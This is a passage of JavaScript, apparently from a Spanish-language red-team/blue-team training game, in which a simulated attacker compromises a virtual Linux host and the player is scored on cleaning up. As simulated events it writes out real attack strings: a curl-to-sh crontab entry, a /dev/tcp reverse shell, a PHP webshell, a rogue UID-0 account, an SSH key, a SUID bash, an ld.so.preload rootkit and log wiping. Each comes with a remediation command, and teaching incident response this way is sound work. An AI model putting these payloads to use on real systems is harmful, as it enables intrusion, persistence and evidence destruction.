    const n = Linux.nodo(sh, "/etc/passwd"); n.d += "svc-update:x:0:0:Update Service:/root:/bin/bash\n";
    alerta("Cambio en cuentas de usuario", "Se agregó una cuenta con UID 0 en /etc/passwd");
  } else if (acc === "cron") {
    LRB.ipCron = LRB.ip;
    Linux.nodo(sh, "/etc/crontab").d += `*/5 * * * * root curl -s http://${LRB.ip}/update.sh | sh\n`;
    alerta("Cambio en tareas programadas", `Se modificó /etc/crontab (descarga desde ${LRB.ip})`);
  } else if (acc === "minero") {
    Linux.mkdirP(sh, "/tmp/.x", "backup"); Linux.escribir(sh, "/tmp/.x/xmrig", "ELF…", "backup", "755");
    sh.procesos.push({ pid: 4000 + Math.floor(Math.random() * 3000), u: "backup", cmd: "/tmp/.x/xmrig -o pool.minexmr.com:443", oculto: true });
    alerta("Uso de CPU al 100%", "Proceso desconocido /tmp/.x/xmrig consumiendo CPU");
  } else if (acc === "llave_ssh") {
    Linux.nodo(sh, "/root/.ssh/authorized_keys").d += "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEvil kali@atacante\n";
    alerta("Cambio en llaves SSH", "Se agregó una llave a /root/.ssh/authorized_keys");
  } else if (acc === "suid") {
    Linux.mkdirP(sh, "/var/tmp", "root");
    Linux.escribir(sh, "/var/tmp/.sysd", "ELF… (copia de /bin/bash)", "root", "755"); Linux.nodo(sh, "/var/tmp/.sysd").suid = true;
    alerta("Binario SUID nuevo", "Apareció un binario SUID de root fuera de /usr/bin: /var/tmp/.sysd (copia de bash)");
  } else if (acc === "shell_inversa") {
    sh.procesos.push({ pid: 5000 + Math.floor(Math.random() * 3000), u: "www-data", cmd: `bash -c bash -i >& /dev/tcp/${LRB.ip}/4444 0>&1`,
      red: `${LRB.ip}:4444`, puerto: 40000 + Math.floor(Math.random() * 20000), oculto: true });
    alerta("Conexión saliente sospechosa", `Un bash de www-data tiene una conexión abierta hacia ${LRB.ip}:4444 (shell inversa)`);
  } else if (acc === "webshell") {
    Linux.escribir(sh, "/var/www/html/uploads/.thumb.php", "<?php @system($_REQUEST['c']); ?>\n", "www-data");
    alerta("Archivo PHP en la carpeta de subidas", "Se creó /var/www/html/uploads/.thumb.php (ahí solo deberían llegar imágenes)");
  } else if (acc === "ld_preload") {
    Linux.escribir(sh, "/usr/lib/x86_64-linux-gnu/libsysperf.so", "ELF…", "root");
    Linux.escribir(sh, "/etc/ld.so.preload", "/usr/lib/x86_64-linux-gnu/libsysperf.so\n", "root");
    alerta("Cambio en /etc/ld.so.preload", "Se creó /etc/ld.so.preload: una librería se inyecta en todos los procesos y puede esconderlos (rootkit)");
  } else if (acc === "borrar_huellas") {
    LRB.hecho.borrar = true;
    const n = Linux.nodo(sh, "/var/log/auth.log"); n.d = n.d.split("\n").filter((l) => !/Accepted password/.test(l)).join("\n");
  }
  if (acc !== "fuerza_bruta") RB.hist.push({ accion: acc, resultado: "exito", t });
  mensajeAtacante(j.mensaje);
  evaluarLinuxRvb();
  RB.tickT = setTimeout(tickAtacante, d.tick * 1000);
}

function evaluarLinuxRvb() {
  if (!RB.activo) return;
  const e = estadoLinux(), peso = { usuario: 3, cron: 3, minero: 4, llave: 3, suid: 3, shell: 4, webshell: 3, preload: 3 };
  const ahora = Date.now(), dt = (ahora - (LRB.ultimo || ahora)) / 1000;
  LRB.ultimo = ahora;
  const activos = Object.keys(peso).filter((k) => e[k]);
  const danio = (activos.reduce((s, k) => s + peso[k], 0) + (LRB.acceso ? 2 : 0)) * dt * (DIF_RB[RB.dif].danio / 25) / 10;
  RB.hp -= danio;
  // puntos por cada puerta trasera que cierras (una vez)
  for (const k of Object.keys(peso)) {
    if (LRB[`v_${k}`] && !e[k] && !LRB[`c_${k}`]) { LRB[`c_${k}`] = true; RB.puntos += 60; celebrar(`🛡️ +60 · ${k}`, "xp"); }
    if (e[k]) LRB[`v_${k}`] = true;
  }
  for (const ip of LRB.ips) if (bloqueada(ip) && !LRB[`b_${ip}`]) { LRB[`b_${ip}`] = true; RB.puntos += 40; celebrar(`🧱 IP ${ip} bloqueada +40`, "xp"); }
  if (e.backupBloq && !LRB.c_backup) { LRB.c_backup = true; RB.puntos += 40; }
  actualizarHud();
  if (RB.hp <= 0) finLinuxRvb(false);
}
setInterval(() => { if (RB.activo && RB.modo === "linux") evaluarLinuxRvb(); }, 2000);

function finLinuxRvb(declarado) {
  if (!RB.activo) return;
  const transcurrido = (Date.now() - RB.inicio) / 1000, dur = DIF_RB[RB.dif].durLinux;
  if (declarado && transcurrido < dur * 0.6) return aviso(`Aún no: el atacante sigue activo. Podrás declarar el incidente contenido en ${fmtT(dur * 0.6 - transcurrido)}.`);
  const e = estadoLinux();
  const dentro = LRB.acceso || e.usuario || e.cron || e.minero || e.llave || e.suid || e.shell || e.webshell || e.preload;
  const gano = RB.hp > 0 && !dentro;
  if (gano) RB.puntos += Math.round(RB.hp * 2);
  const check = [
    ["IPs del atacante bloqueadas en ufw (y ufw activo)", LRB.ips.every(bloqueada) || !e.sshOn, `sudo ufw deny from ${LRB.ips.join(" / ")} ; sudo ufw enable`],
    ["Cuenta backup bloqueada (contraseña débil)", e.backupBloq, "sudo usermod -L backup"],
    ["Usuario root falso eliminado", !e.usuario, "sudo userdel svc-update"],
    ["Tarea maliciosa de cron eliminada", !e.cron, "sudo sed -i '/curl/d' /etc/crontab"],
    ["Minero detenido", !e.minero, "sudo pkill -f xmrig"],
    ["Llave SSH del atacante eliminada", !e.llave, "sudo sed -i '/kali@atacante/d' /root/.ssh/authorized_keys"],
    ...[["suid", "Binario SUID del atacante eliminado", "find / -perm -4000 2>/dev/null ; sudo rm /var/tmp/.sysd"],
      ["shell", "Shell inversa cortada", "ss -tnp ; sudo pkill -f /dev/tcp"],
      ["webshell", "Webshell borrada", "ls -la /var/www/html/uploads ; sudo rm /var/www/html/uploads/.thumb.php"],
      ["preload", "Rootkit de LD_PRELOAD quitado (y luego el minero que escondía)", "cat /etc/ld.so.preload ; sudo rm /etc/ld.so.preload"]]
      .filter(([k]) => LRB[`v_${k}`]).map(([k, t, cmd]) => [t, !e[k], cmd]),
  ];
  RB.hist.push({ fin: true, tus_comandos: LRB.eventos.slice(-25) });
  finRvb(gano, `<p>${dentro ? "El atacante seguía adentro al final." : "El atacante quedó afuera."}</p>
    <ul class="rvb-crono">${check.map(([t, ok, cmd]) => `<li class="${ok ? "ok-txt" : "error"}">${ok ? "✓" : "✗"} ${esc(t)}${ok ? "" : ` → <code>${esc(cmd)}</code>`}</li>`).join("")}</ul>`);
}
